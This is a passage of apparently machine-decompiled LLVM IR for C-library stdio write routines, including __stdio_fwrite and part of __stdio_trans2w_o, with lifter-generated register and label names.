  store i32 %v5_13dd0, i32* %r7.global-to-local, align 4
  %v5_13dd4 = sub i32 %v0_13dcc, %v4_13dc4
  store i32 %v5_13dd4, i32* %r5.global-to-local, align 4
  %v2_13dac = icmp eq i32 %v5_13dd4, 0
  store i1 %v2_13dac, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_13dd4, i32* @r2, align 4
  br i1 %v2_13dac, label %dec_label_pc_13dac.dec_label_pc_13e4c.loopexit_crit_edge, label %dec_label_pc_13db8

dec_label_pc_13db8:                               ; preds = %entry, %dec_label_pc_13dacthread-pre-split
  %v0_13dbc = phi i32 [ %v5_13dd0, %dec_label_pc_13dacthread-pre-split ], [ %arg2, %entry ]
  %v0_13db8.in = phi i32 [ %v5_13dd4, %dec_label_pc_13dacthread-pre-split ], [ %arg3, %entry ]
  %v0_13db8 = icmp slt i32 %v0_13db8.in, 0
  br i1 %v0_13db8, label %bb, label %bb22

bb:                                               ; preds = %dec_label_pc_13db8
  store i32 2147483647, i32* @r2, align 4
  br label %bb22

bb22:                                             ; preds = %dec_label_pc_13db8, %bb
  %v0_13dc0 = load i32, i32* @r4, align 4
  %v1_13dc0 = add i32 %v0_13dc0, 4
  %v2_13dc0 = inttoptr i32 %v1_13dc0 to i32*
  %v3_13dc0 = load i32, i32* %v2_13dc0, align 4
  store i32 %v3_13dc0, i32* %r0.global-to-local, align 4
  %tmp23 = inttoptr i32 %v0_13dbc to i32*
  %v4_13dc4 = call i32 @__libc_write(i32 %v3_13dc0, i32* %tmp23)
  store i32 %v4_13dc4, i32* %r0.global-to-local, align 4
  %v1_13dc8 = icmp slt i32 %v4_13dc4, 0
  %v2_13dc8 = icmp eq i32 %v4_13dc4, 0
  store i1 %v2_13dc8, i1* %cpsr_z.global-to-local, align 1
  %v0_13dcc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13dcc, i32* %r6.global-to-local, align 4
  br i1 %v1_13dc8, label %dec_label_pc_13ddc, label %dec_label_pc_13dacthread-pre-split

dec_label_pc_13ddc:                               ; preds = %bb22
  %v0_13ddc = load i32, i32* @r4, align 4
  %v1_13ddc = inttoptr i32 %v0_13ddc to i32*
  %v2_13ddc = load i32, i32* %v1_13ddc, align 4
  store i32 %v2_13ddc, i32* %r3.global-to-local, align 4
  %v1_13de0 = add i32 %v0_13ddc, 8
  store i32 %v1_13de0, i32* %r0.global-to-local, align 4
  %v1_13de4 = inttoptr i32 %v1_13de0 to i32*
  %v2_13de4 = load i32, i32* %v1_13de4, align 4
  store i32 %v2_13de4, i32* %r0.global-to-local, align 4
  %v3_13de4 = add i32 %v0_13ddc, 12
  %v4_13de4 = inttoptr i32 %v3_13de4 to i32*
  %v5_13de4 = load i32, i32* %v4_13de4, align 4
  %v1_13de8 = or i32 %v2_13ddc, 8
  store i32 %v1_13de8, i32* %r3.global-to-local, align 4
  %v3_13dec = sdiv i32 %v2_13ddc, 256
  %v2_13df0 = sub i32 %v5_13de4, %v2_13de4
  store i32 %v2_13df0, i32* %r2.global-to-local, align 4
  %v9_13df0 = icmp eq i32 %v5_13de4, %v2_13de4
  store i1 %v9_13df0, i1* %cpsr_z.global-to-local, align 1
  %v1_13df4 = trunc i32 %v3_13dec to i8
  %v3_13df4 = add i32 %v0_13ddc, 1
  %v4_13df4 = inttoptr i32 %v3_13df4 to i8*
  store i8 %v1_13df4, i8* %v4_13df4, align 1
  %v0_13df8 = load i32, i32* %r3.global-to-local, align 4
  %v1_13df8 = trunc i32 %v0_13df8 to i8
  %v2_13df8 = load i32, i32* @r4, align 4
  %v3_13df8 = inttoptr i32 %v2_13df8 to i8*
  store i8 %v1_13df8, i8* %v3_13df8, align 1
  %v0_13dfc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13dfc, label %dec_label_pc_13ddc.dec_label_pc_13e48_crit_edge, label %dec_label_pc_13e00

dec_label_pc_13ddc.dec_label_pc_13e48_crit_edge:  ; preds = %dec_label_pc_13ddc
  %v0_13e48.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13e48

dec_label_pc_13e00:                               ; preds = %dec_label_pc_13ddc
  %v0_13e00 = load i32, i32* %r2.global-to-local, align 4
  %v1_13e00 = load i32, i32* %r5.global-to-local, align 4
  %v9_13e00 = icmp eq i32 %v0_13e00, %v1_13e00
  store i1 %v9_13e00, i1* %cpsr_z.global-to-local, align 1
  %tmp29 = icmp ugt i32 %v0_13e00, %v1_13e00
  br i1 %tmp29, label %.preheader, label %bb24

bb24:                                             ; preds = %dec_label_pc_13e00
  store i32 %v0_13e00, i32* %r6.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_13e00, %bb24
  %v0_13e08.pre = load i32, i32* %r7.global-to-local, align 4
  %v2_13e0c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb25

bb25:                                             ; preds = %.preheader, %dec_label_pc_13e2c
  %v2_13e0c = phi i32 [ %v2_13e0c.pre, %.preheader ], [ %v1_13e30, %dec_label_pc_13e2c ]
  %v0_13e08 = phi i32 [ %v0_13e08.pre, %.preheader ], [ %v1_13e18, %dec_label_pc_13e2c ]
  %v1_13e08 = inttoptr i32 %v0_13e08 to i8*
  %v2_13e08 = load i8, i8* %v1_13e08, align 1
  %v3_13e08 = zext i8 %v2_13e08 to i32
  store i32 %v3_13e08, i32* %r3.global-to-local, align 4
  %v3_13e0c = inttoptr i32 %v2_13e0c to i8*
  store i8 %v2_13e08, i8* %v3_13e0c, align 1
  %v0_13e10 = load i32, i32* %r0.global-to-local, align 4
  %v1_13e10 = inttoptr i32 %v0_13e10 to i8*
  %v2_13e10 = load i8, i8* %v1_13e10, align 1
  %v3_13e10 = zext i8 %v2_13e10 to i32
  store i32 %v3_13e10, i32* %r3.global-to-local, align 4
  %v7_13e14 = icmp eq i8 %v2_13e10, 10
  store i1 %v7_13e14, i1* %cpsr_z.global-to-local, align 1
  %v0_13e18 = load i32, i32* %r7.global-to-local, align 4
  %v1_13e18 = add i32 %v0_13e18, 1
  store i32 %v1_13e18, i32* %r7.global-to-local, align 4
  br i1 %v7_13e14, label %dec_label_pc_13e20, label %dec_label_pc_13e2c

dec_label_pc_13e20:                               ; preds = %bb25
  %v0_13e20 = load i32, i32* @r4, align 4
  %v1_13e20 = add i32 %v0_13e20, 1
  %v2_13e20 = inttoptr i32 %v1_13e20 to i8*
  %v3_13e20 = load i8, i8* %v2_13e20, align 1
  %v4_13e20 = zext i8 %v3_13e20 to i32
  store i32 %v4_13e20, i32* %r3.global-to-local, align 4
  %tmp30 = urem i8 %v3_13e20, 2
  %v2_13e24 = icmp eq i8 %tmp30, 0
  store i1 %v2_13e24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13e24, label %dec_label_pc_13e2c, label %dec_label_pc_13e38

dec_label_pc_13e2c:                               ; preds = %dec_label_pc_13e20, %bb25
  %v0_13e2c = load i32, i32* %r6.global-to-local, align 4
  %v1_13e2c = add i32 %v0_13e2c, -1
  store i32 %v1_13e2c, i32* %r6.global-to-local, align 4
  %v7_13e2c = icmp eq i32 %v0_13e2c, 1
  store i1 %v7_13e2c, i1* %cpsr_z.global-to-local, align 1
  %v1_13e30 = add i32 %v0_13e10, 1
  store i32 %v1_13e30, i32* %r0.global-to-local, align 4
  br i1 %v7_13e2c, label %dec_label_pc_13e2c.dec_label_pc_13e38_crit_edge, label %bb25

dec_label_pc_13e2c.dec_label_pc_13e38_crit_edge:  ; preds = %dec_label_pc_13e2c
  %v0_13e38.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13e38

dec_label_pc_13e38:                               ; preds = %dec_label_pc_13e20, %dec_label_pc_13e2c.dec_label_pc_13e38_crit_edge
  %v0_13e3c = phi i32 [ %v1_13e30, %dec_label_pc_13e2c.dec_label_pc_13e38_crit_edge ], [ %v0_13e10, %dec_label_pc_13e20 ]
  %v0_13e38 = phi i32 [ %v0_13e38.pre, %dec_label_pc_13e2c.dec_label_pc_13e38_crit_edge ], [ %v0_13e20, %dec_label_pc_13e20 ]
  %v1_13e38 = add i32 %v0_13e38, 8
  %v2_13e38 = inttoptr i32 %v1_13e38 to i32*
  %v3_13e38 = load i32, i32* %v2_13e38, align 4
  store i32 %v3_13e38, i32* %r3.global-to-local, align 4
  %v2_13e3c = add i32 %v0_13e38, 16
  %v3_13e3c = inttoptr i32 %v2_13e3c to i32*
  store i32 %v0_13e3c, i32* %v3_13e3c, align 4
  %v0_13e40 = load i32, i32* %r3.global-to-local, align 4
  %v1_13e40 = load i32, i32* %r0.global-to-local, align 4
  %v2_13e40 = sub i32 %v1_13e40, %v0_13e40
  store i32 %v2_13e40, i32* %r3.global-to-local, align 4
  %v1_13e44 = load i32, i32* %r5.global-to-local, align 4
  %v2_13e44 = sub i32 %v1_13e44, %v2_13e40
  store i32 %v2_13e44, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13e48

dec_label_pc_13e48:                               ; preds = %dec_label_pc_13ddc.dec_label_pc_13e48_crit_edge, %dec_label_pc_13e38
  %v0_13e48 = phi i32 [ %v0_13e48.pre, %dec_label_pc_13ddc.dec_label_pc_13e48_crit_edge ], [ %v2_13e44, %dec_label_pc_13e38 ]
  %v1_13e48 = load i32, i32* %r8.global-to-local, align 4
  %v2_13e48 = sub i32 %v1_13e48, %v0_13e48
  store i32 %v2_13e48, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13e4c

dec_label_pc_13dac.dec_label_pc_13e4c.loopexit_crit_edge: ; preds = %dec_label_pc_13dacthread-pre-split
  %v0_13e4c.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13e4c

dec_label_pc_13e4c:                               ; preds = %entry, %dec_label_pc_13dac.dec_label_pc_13e4c.loopexit_crit_edge, %dec_label_pc_13e48
  %v0_13e4c = phi i32 [ %v2_13e48, %dec_label_pc_13e48 ], [ %v0_13e4c.pre.pre, %dec_label_pc_13dac.dec_label_pc_13e4c.loopexit_crit_edge ], [ 0, %entry ]
  store i32 %v0_13e4c, i32* %r0.global-to-local, align 4
  ret i32 %v0_13e4c

; uselistorder directives
  uselistorder i32 %v0_13e4c, { 1, 0 }
  uselistorder i32 %v0_13e38, { 1, 0 }
  uselistorder i32 %v1_13e30, { 0, 2, 1 }
  uselistorder i32 %v0_13e2c, { 1, 0 }
  uselistorder i1 %v2_13e24, { 1, 0 }
  uselistorder i32 %v1_13e18, { 1, 0 }
  uselistorder i32 %v0_13e00, { 1, 0, 2 }
  uselistorder i32 %v5_13de4, { 1, 0 }
  uselistorder i32 %v2_13de4, { 1, 0, 2 }
  uselistorder i32 %v0_13dcc, { 1, 0 }
  uselistorder i32 %v4_13dc4, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v5_13dd4, { 0, 2, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 3, 5, 4, 1, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 9, 8, 0 }
  uselistorder i32 (i32, i32*)* @__libc_write, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13e4c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_13e48, { 1, 0 }
  uselistorder label %dec_label_pc_13e38, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %dec_label_pc_13db8, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_13e54 = load i32, i32* @r4, align 4
  store i32 %v3_13e54, i32* %stack_var_-20, align 4
  %v6_13e54 = load i32, i32* @r5, align 4
  %v9_13e54 = load i32, i32* @r6, align 4
  %v12_13e54 = load i32, i32* @r7, align 4
  %v15_13e54 = load i32, i32* @lr, align 4
  %v1_13e58 = add i32 %arg3, 1
  %v2_13e58 = inttoptr i32 %v1_13e58 to i8*
  %v3_13e58 = load i8, i8* %v2_13e58, align 1
  %v4_13e58 = zext i8 %v3_13e58 to i32
  %v3_13e5c = mul nuw nsw i32 %v4_13e58, 256
  %v1_13e60 = and i32 %v3_13e5c, 512
  store i32 %v1_13e60, i32* @r4, align 4
  %v2_13e60 = icmp eq i32 %v1_13e60, 0
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_13e60, label %dec_label_pc_13e74, label %dec_label_pc_13f70

dec_label_pc_13e74:                               ; preds = %entry
  %v1_13e74 = add i32 %arg3, 4
  %v2_13e74 = inttoptr i32 %v1_13e74 to i32*
  %v3_13e74 = load i32, i32* %v2_13e74, align 4
  %v1_13e7c = add i32 %arg3, 16
  %v2_13e7c = inttoptr i32 %v1_13e7c to i32*
  %v3_13e7c = load i32, i32* %v2_13e7c, align 4
  store i32 %v3_13e7c, i32* @r0, align 4
  %v1_13e80 = add i32 %arg3, 12
  %v2_13e80 = inttoptr i32 %v1_13e80 to i32*
  %v3_13e80 = load i32, i32* %v2_13e80, align 4
  %v4_13e84 = icmp eq i32 %v3_13e74, -2
  %v2_13e88 = sub i32 %v3_13e80, %v3_13e7c
  br i1 %v4_13e84, label %dec_label_pc_13e88, label %dec_label_pc_13eb0

dec_label_pc_13e88:                               ; preds = %dec_label_pc_13e74
  %v3_13e8c = icmp ugt i32 %v2_13e88, %arg2
  br i1 %v3_13e8c, label %bb, label %bb10

bb:                                               ; preds = %dec_label_pc_13e88
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_13e88, %bb
  %storemerge = phi i32 [ %arg2, %bb ], [ %v2_13e88, %dec_label_pc_13e88 ]
  %v0_13e94 = phi i32 [ %arg2, %bb ], [ %v2_13e88, %dec_label_pc_13e88 ]
  store i32 %storemerge, i32* @r4, align 4
  store i32 %v0_13e94, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_13e9c = call i32 @memcpy()
  %v0_13ea0 = load i32, i32* @r5, align 4
  %v1_13ea0 = add i32 %v0_13ea0, 16
  %v2_13ea0 = inttoptr i32 %v1_13ea0 to i32*
  %v3_13ea0 = load i32, i32* %v2_13ea0, align 4
  %v1_13ea4 = load i32, i32* @r4, align 4
  %v2_13ea4 = add i32 %v1_13ea4, %v3_13ea0
  store i32 %v2_13ea4, i32* %v2_13ea0, align 4
  br label %dec_label_pc_13f84

dec_label_pc_13eb0:                               ; preds = %dec_label_pc_13e74
  %tmp = icmp ult i32 %v2_13e88, %arg2
  br i1 %tmp, label %dec_label_pc_13f50, label %dec_label_pc_13ebc

dec_label_pc_13ebc:                               ; preds = %dec_label_pc_13eb0
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_13ec4 = call i32 @memcpy()
  %v0_13ec8 = load i32, i32* @r5, align 4
  %v1_13ec8 = add i32 %v0_13ec8, 16
  %v2_13ec8 = inttoptr i32 %v1_13ec8 to i32*
  %v3_13ec8 = load i32, i32* %v2_13ec8, align 4
  %v1_13ecc = add i32 %v0_13ec8, 1
  %v2_13ecc = inttoptr i32 %v1_13ecc to i8*
  %v3_13ecc = load i8, i8* %v2_13ecc, align 1
  %v1_13ed0 = load i32, i32* @r6, align 4
  %v2_13ed0 = add i32 %v1_13ed0, %v3_13ec8
  %tmp17 = urem i8 %v3_13ecc, 2
  %v2_13ed4 = icmp eq i8 %tmp17, 0
  store i32 %v2_13ed0, i32* %v2_13ec8, align 4
  br i1 %v2_13ed4, label %dec_label_pc_13f84, label %dec_label_pc_13ee0

dec_label_pc_13ee0:                               ; preds = %dec_label_pc_13ebc
  %v0_13ee0 = load i32, i32* %r7.global-to-local, align 4
  %v0_13ee8 = load i32, i32* @r6, align 4
  %v4_13eec = call i32 @memrchr(i32 %v0_13ee0, i32 10, i32 %v0_13ee8, i32 %v2_13ed0)
  %v2_13ef0 = icmp eq i32 %v4_13eec, 0
  br i1 %v2_13ef0, label %dec_label_pc_13f84, label %dec_label_pc_13ef8

dec_label_pc_13ef8:                               ; preds = %dec_label_pc_13ee0
  %v0_13ef8 = load i32, i32* @r5, align 4
  store i32 %v0_13ef8, i32* @r0, align 4
  %v0_13efc = call i32 @__stdio_wcommit()
  %v2_13f00 = icmp eq i32 %v0_13efc, 0
  br i1 %v2_13f00, label %dec_label_pc_13f84, label %dec_label_pc_13f08

dec_label_pc_13f08:                               ; preds = %dec_label_pc_13ef8
  %v0_13f08 = load i32, i32* @r6, align 4
  %v3_13f08 = icmp uge i32 %v0_13f08, %v0_13efc
  %v0_13efc.v0_13f08 = select i1 %v3_13f08, i32 %v0_13efc, i32 %v0_13f08
  store i32 %v0_13efc.v0_13f08, i32* @r4, align 4
  %v2_13f14 = sub i32 %v0_13f08, %v0_13efc.v0_13f08
  %v0_13f18 = load i32, i32* %r7.global-to-local, align 4
  %v2_13f18 = add i32 %v0_13f18, %v2_13f14
  store i32 %v2_13f18, i32* %r7.global-to-local, align 4
  store i32 %v0_13efc.v0_13f08, i32* @r2, align 4
  %v4_13f28 = call i32 @__GI_memchr(i32 %v2_13f18, i32 10, i32 %v0_13efc.v0_13f08, i32 %v2_13f14)
  %v2_13f2c = icmp eq i32 %v4_13f28, 0
  br i1 %v2_13f2c, label %dec_label_pc_13f84, label %dec_label_pc_13f34

dec_label_pc_13f34:                               ; preds = %dec_label_pc_13f08
  %v0_13f34 = load i32, i32* @r5, align 4
  %v1_13f34 = add i32 %v0_13f34, 16
  %v2_13f34 = inttoptr i32 %v1_13f34 to i32*
  %v3_13f34 = load i32, i32* %v2_13f34, align 4
  %v0_13f38 = load i32, i32* %r7.global-to-local, align 4
  %v1_13f38 = load i32, i32* @r4, align 4
  %v2_13f38 = sub i32 %v0_13f38, %v4_13f28
  %v2_13f3c = add i32 %v2_13f38, %v1_13f38
  %v2_13f40 = sub i32 %v3_13f34, %v2_13f3c
  %v1_13f44 = load i32, i32* @r6, align 4
  %v2_13f44 = sub i32 %v1_13f44, %v2_13f3c
  store i32 %v2_13f44, i32* @r6, align 4
  store i32 %v2_13f40, i32* %v2_13f34, align 4
  br label %dec_label_pc_13f84

dec_label_pc_13f50:                               ; preds = %dec_label_pc_13eb0
  %v1_13f50 = add i32 %arg3, 8
  %v2_13f50 = inttoptr i32 %v1_13f50 to i32*
  %v3_13f50 = load i32, i32* %v2_13f50, align 4
  %v9_13f54 = icmp eq i32 %v3_13e7c, %v3_13f50
  br i1 %v9_13f54, label %dec_label_pc_13f70, label %dec_label_pc_13f5c

dec_label_pc_13f5c:                               ; preds = %dec_label_pc_13f50
  store i32 %arg3, i32* @r0, align 4
  %v0_13f60 = call i32 @__stdio_wcommit()
  %v2_13f64 = icmp eq i32 %v0_13f60, 0
  br i1 %v2_13f64, label %dec_label_pc_13f5c.dec_label_pc_13f70_crit_edge, label %bb13

dec_label_pc_13f5c.dec_label_pc_13f70_crit_edge:  ; preds = %dec_label_pc_13f5c
  %v0_13f78.pre = load i32, i32* @r6, align 4
  %v0_13f70.pre = load i32, i32* @r5, align 4
  %v0_13f74.pre = load i32, i32* %r7.global-to-local, align 4
  %v2_13f7c.pre = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_13f70

bb13:                                             ; preds = %dec_label_pc_13f5c
  %v1_13f68 = load i32, i32* @r4, align 4
  store i32 %v1_13f68, i32* @r6, align 4
  br label %dec_label_pc_13f84

dec_label_pc_13f70:                               ; preds = %dec_label_pc_13f5c.dec_label_pc_13f70_crit_edge, %entry, %dec_label_pc_13f50
  %v2_13f7c = phi i32 [ %v2_13f7c.pre, %dec_label_pc_13f5c.dec_label_pc_13f70_crit_edge ], [ %v3_13e54, %entry ], [ %v3_13e54, %dec_label_pc_13f50 ]
  %v0_13f74 = phi i32 [ %v0_13f74.pre, %dec_label_pc_13f5c.dec_label_pc_13f70_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_13f50 ]
  %v0_13f70 = phi i32 [ %v0_13f70.pre, %dec_label_pc_13f5c.dec_label_pc_13f70_crit_edge ], [ %arg3, %entry ], [ %arg3, %dec_label_pc_13f50 ]
  %v0_13f78 = phi i32 [ %v0_13f78.pre, %dec_label_pc_13f5c.dec_label_pc_13f70_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_13f50 ]
  store i32 %v2_13f7c, i32* @r4, align 4
  store i32 %v9_13e54, i32* @r6, align 4
  store i32 %v15_13e54, i32* @lr, align 4
  %v3_13f80 = inttoptr i32 %v0_13f70 to i8*
  %v4_13f80 = call i32 @__stdio_WRITE(i8* %v3_13f80, i32 %v0_13f74, i32 %v0_13f78)
  br label %dec_label_pc_13f84

dec_label_pc_13f84:                               ; preds = %bb13, %dec_label_pc_13f08, %dec_label_pc_13ef8, %dec_label_pc_13ee0, %dec_label_pc_13ebc, %dec_label_pc_13f34, %bb10, %dec_label_pc_13f70
  %v0_13f84 = load i32, i32* @r6, align 4
  %v2_13f88 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13f88, i32* @r4, align 4
  store i32 %v6_13e54, i32* @r5, align 4
  store i32 %v9_13e54, i32* @r6, align 4
  store i32 %v12_13e54, i32* @r7, align 4
  ret i32 %v0_13f84

; uselistorder directives
  uselistorder i32 %v2_13f3c, { 1, 0 }
  uselistorder i32 %v2_13f14, { 1, 0 }
  uselistorder i32 %v0_13efc.v0_13f08, { 1, 2, 0, 3 }
  uselistorder i32 %v0_13f08, { 1, 0, 2 }
  uselistorder i32 %v2_13e88, { 2, 0, 1, 3 }
  uselistorder i32 %v9_13e54, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 %arg3, { 0, 1, 2, 6, 8, 7, 5, 3, 4 }
  uselistorder i32 %arg2, { 3, 4, 5, 2, 0, 1, 6, 7 }
  uselistorder i32 %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_13f84, { 7, 0, 5, 1, 2, 3, 4, 6 }
  uselistorder label %dec_label_pc_13f70, { 0, 2, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13f8c = load i32, i32* @r4, align 4
  store i32 %v3_13f8c, i32* %stack_var_-8, align 4
  %v3_13f90 = load i8, i8* %arg1, align 1
  %v4_13f90 = zext i8 %v3_13f90 to i32
  store i32 %v4_13f90, i32* %r2.global-to-local, align 4
  %v2_13f94 = add i32 %tmp, 1
  %v3_13f94 = inttoptr i32 %v2_13f94 to i8*
  %v4_13f94 = load i8, i8* %v3_13f94, align 1
  %v5_13f94 = zext i8 %v4_13f94 to i32
  store i32 %v5_13f94, i32* %r3.global-to-local, align 4
  %v4_13f98 = mul nuw nsw i32 %v5_13f94, 256
  %v5_13f98 = or i32 %v4_13f98, %v4_13f90
  store i32 %v5_13f98, i32* %r2.global-to-local, align 4
  %v2_13f9c = and i32 %v5_13f98, %arg2
  %v4_13f9c = icmp eq i32 %v2_13f9c, 0
  store i1 %v4_13f9c, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  br i1 %v4_13f9c, label %dec_label_pc_13fa8, label %dec_label_pc_13fc0

dec_label_pc_13fa8:                               ; preds = %entry
  %v1_13fa8 = and i32 %v5_13f98, 2176
  %v2_13fa8 = icmp eq i32 %v1_13fa8, 0
  store i1 %v2_13fa8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13fa8, label %dec_label_pc_13fb0, label %dec_label_pc_13fd4

dec_label_pc_13fb0:                               ; preds = %dec_label_pc_13fa8
  %v2_13fb0 = or i32 %v5_13f98, %arg2
  store i32 %v2_13fb0, i32* %r2.global-to-local, align 4
  %v3_13fb4 = sdiv i32 %v2_13fb0, 256
  store i32 %v3_13fb4, i32* %r3.global-to-local, align 4
  %v1_13fb8 = trunc i32 %v3_13fb4 to i8
  store i8 %v1_13fb8, i8* %v3_13f94, align 1
  %v0_13fbc = load i32, i32* %r2.global-to-local, align 4
  %v1_13fbc = trunc i32 %v0_13fbc to i8
  store i8 %v1_13fbc, i8* %arg1, align 1
  %v0_13fc0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13fc0

dec_label_pc_13fc0:                               ; preds = %entry, %dec_label_pc_13fb0
  %v0_1400c = phi i32 [ %tmp, %entry ], [ %v0_13fc0.pre, %dec_label_pc_13fb0 ]
  %v1_13fc0 = inttoptr i32 %v0_1400c to i8*
  %v2_13fc0 = load i8, i8* %v1_13fc0, align 1
  %v3_13fc0 = zext i8 %v2_13fc0 to i32
  store i32 %v3_13fc0, i32* %r2.global-to-local, align 4
  %v1_13fc4 = add i32 %v0_1400c, 1
  %v2_13fc4 = inttoptr i32 %v1_13fc4 to i8*
  %v3_13fc4 = load i8, i8* %v2_13fc4, align 1
  %v4_13fc4 = zext i8 %v3_13fc4 to i32
  store i32 %v4_13fc4, i32* %r3.global-to-local, align 4
  %v4_13fc8 = mul nuw nsw i32 %v4_13fc4, 256
  %v5_13fc8 = or i32 %v4_13fc8, %v3_13fc0
  store i32 %v5_13fc8, i32* @ip, align 4
  %v1_13fcc = and i32 %v3_13fc0, 32
  %v2_13fcc = icmp eq i32 %v1_13fcc, 0
  store i1 %v2_13fcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13fcc, label %dec_label_pc_13ffc, label %dec_label_pc_13fd4

dec_label_pc_13fd4:                               ; preds = %dec_label_pc_13fa8, %dec_label_pc_13fc0
  %v0_13fd4 = call i32 @__errno_location()
  store i32 %v0_13fd4, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_13fdc = inttoptr i32 %v0_13fd4 to i32*
  store i32 9, i32* %v2_13fdc, align 4
  br label %dec_label_pc_13fe0

dec_label_pc_13fe0:                               ; preds = %dec_label_pc_14024, %dec_label_pc_13fd4
  %v0_13fe0 = load i32, i32* @r4, align 4
  %v1_13fe0 = inttoptr i32 %v0_13fe0 to i32*
  %v2_13fe0 = load i32, i32* %v1_13fe0, align 4
  %v1_13fe4 = or i32 %v2_13fe0, 8
  store i32 %v1_13fe4, i32* %r3.global-to-local, align 4
  %v3_13fe8 = sdiv i32 %v2_13fe0, 256
  store i32 %v3_13fe8, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_13ff0 = trunc i32 %v3_13fe8 to i8
  %v3_13ff0 = add i32 %v0_13fe0, 1
  %v4_13ff0 = inttoptr i32 %v3_13ff0 to i8*
  store i8 %v1_13ff0, i8* %v4_13ff0, align 1
  %v0_13ff4 = load i32, i32* %r3.global-to-local, align 4
  %v1_13ff4 = trunc i32 %v0_13ff4 to i8
  %v2_13ff4 = load i32, i32* @r4, align 4
  %v3_13ff4 = inttoptr i32 %v2_13ff4 to i8*
  store i8 %v1_13ff4, i8* %v3_13ff4, align 1
  %v2_13ff8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13ff8, i32* @r4, align 4
  ret i32 -1

dec_label_pc_13ffc:                               ; preds = %dec_label_pc_13fc0
  %tmp15 = urem i8 %v2_13fc0, 4
  %v2_13ffc = icmp eq i8 %tmp15, 0
  store i1 %v2_13ffc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13ffc, label %dec_label_pc_14060, label %dec_label_pc_14004

dec_label_pc_14004:                               ; preds = %dec_label_pc_13ffc
  %v1_14004 = and i32 %v3_13fc0, 4
  store i32 %v1_14004, i32* @r1, align 4
  %v2_14004 = icmp eq i32 %v1_14004, 0
  store i1 %v2_14004, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14004, label %dec_label_pc_1400c, label %dec_label_pc_1403c

dec_label_pc_1400c:                               ; preds = %dec_label_pc_14004
  %v1_1400c = add i32 %v0_1400c, 20
  %v2_1400c = inttoptr i32 %v1_1400c to i32*
  %v3_1400c = load i32, i32* %v2_1400c, align 4
  store i32 %v3_1400c, i32* %r2.global-to-local, align 4
  %v1_14010 = add i32 %v0_1400c, 16
  %v2_14010 = inttoptr i32 %v1_14010 to i32*
  %v3_14010 = load i32, i32* %v2_14010, align 4
  store i32 %v3_14010, i32* %r3.global-to-local, align 4
  %v9_14014 = icmp eq i32 %v3_1400c, %v3_14010
  store i1 %v9_14014, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14014, label %dec_label_pc_1401c, label %dec_label_pc_14024

dec_label_pc_1401c:                               ; preds = %dec_label_pc_1400c
  %v1_1401c = and i32 %v3_13fc0, 2
  %v2_1401c = icmp eq i32 %v1_1401c, 0
  store i1 %v2_1401c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1401c, label %dec_label_pc_1403c, label %dec_label_pc_14024

dec_label_pc_14024:                               ; preds = %dec_label_pc_1400c, %dec_label_pc_1401c
  %v1_14024 = and i32 %v4_13fc8, 1024
  %v2_14024 = icmp eq i32 %v1_14024, 0
